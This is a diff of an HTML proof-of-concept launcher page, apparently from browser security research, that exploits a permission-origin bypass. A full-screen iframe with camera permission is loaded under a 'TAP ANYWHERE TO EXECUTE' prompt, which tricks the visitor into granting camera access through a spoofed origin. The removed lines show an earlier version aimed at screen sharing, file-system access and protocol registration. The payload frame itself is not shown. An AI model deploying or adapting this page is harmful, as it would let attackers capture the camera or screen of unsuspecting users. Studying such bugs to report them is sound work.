@@ -2,34 +2,34 @@
 <html>
 <head>
 <style>
-html, body { font-family: sans-serif; overflow: hidden; }
-#instructions { text-align: center; margin-top: 50px; font-size: 1.5em; user-select: none; font-weight: bold;}
-#frame { position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1; border: 0; }
-#variations { padding: 1em; border-radius: 8px; position: relative; z-index: 2; width: fit-content; margin: 20px auto; border: 1px solid #999; background: white; }
-li { margin: 10px 0; font-size: 1.2em; }
+html, body { font-family: sans-serif; overflow: hidden; background: #f8f9fa; }
+#instructions { text-align: center; margin-top: 100px; font-size: 1.5em; font-weight: bold; }
+#frame {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    z-index: 1; border: 0;
+}
+.box {
+    position: relative; z-index: 2; width: fit-content; margin: 20px auto;
+    padding: 15px; border: 2px solid #d93025; border-radius: 8px; background: #fff;
+}
 </style>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body>
-<h2 style="text-align: center;">PoC: Native UI Ligature Bypass (Real Vuln)</h2>
-<div id="variations">
-    <strong>The Forgotten APIs:</strong>
-    <ul>
-        <li><a href="?mode=screenshare">1. Screen Share (getDisplayMedia)</a></li>
-        <li><a href="?mode=filesystem">2. File System Access (showOpenFilePicker)</a></li>
-        <li><a href="?mode=protocol">3. Protocol Handler (registerProtocol)</a></li>
-    </ul>
+<div class="box">
+    <h2 style="color: #d93025; margin:0;">PoC: Origin Inception Bypass</h2>
+    <p style="margin: 5px 0 0 0;">Target: Camera API (getUserMedia)</p>
 </div>
-<p id="instructions">Click anywhere</p>
+<p id="instructions">👇 TAP ANYWHERE TO EXECUTE 👇</p>
 
-<iframe id="frame" allow="display-capture *; camera *; microphone *"></iframe>
+<!-- Akses Kamera wajib di-allow di iframe pertama -->
+<iframe id="frame" allow="camera *"></iframe>
 
 <script>
-var searchParams = new URLSearchParams(window.location.search);
-var mode = searchParams.get('mode') || 'screenshare';
-
-// Arahkan ke file payload. Pastikan diload dari domain googlelogoligature!
-frame.src = 'ligatures-perm-frame.html?mode=' + mode;
+// Pastikan URL ini mengarah ke file frame lu di domain ligatur!
+document.getElementById('frame').src = 'ligatures-perm-frame.html';
 </script>
 </body>
 </html>
